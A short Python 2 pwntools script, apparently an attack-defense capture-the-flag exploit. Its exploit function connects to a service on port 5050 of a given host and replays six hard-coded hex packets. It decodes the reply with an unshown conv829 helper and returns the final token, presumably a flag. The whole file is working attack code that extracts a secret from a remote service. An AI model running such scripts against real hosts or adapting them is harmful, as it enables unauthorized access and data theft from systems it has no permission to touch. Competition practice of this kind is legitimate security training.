from os import *
from pwn import *
from wrap import *

import time
import random

PORT = 5050

packets = [
    '1b0dc62371a0d060300500',
    '198dc72341a828',
    '389c4140',
    '198d06a371b028',
    '1b0dc62301b8dc66380500',
    '389c4140'
]

def sending(s):
    s.settimeout(2)
    try:
        for i in range(len(packets)-1):
            print s.recv(1024)
            s.clean()
            s.send(packets[i].decode('hex'))
            time.sleep(0.2)
        s.send(packets[len(packets)-1].decode('hex'))
        time.sleep(1+random.randrange(0,1))
        recved = s.recv(4024)
        return recved
    except Exception as e:
        print e.message
    finally:
        s.close()


def exploit(host):
    s = remote(host, PORT)
    s.settimeout(14)
    s.recv()
    data = ''
    #  s.send(''.join(packets).decode('hex'))
    for packet in packets:
        s.send(packet.decode('hex'))
        s.clean()
        data = s.recv()
        time.sleep(0.3)

    a = bytearray(conv829(bytearray(data)))
    a = ''.join(chr(ch) for ch in a)
    token = a.split()[-1]
    return token
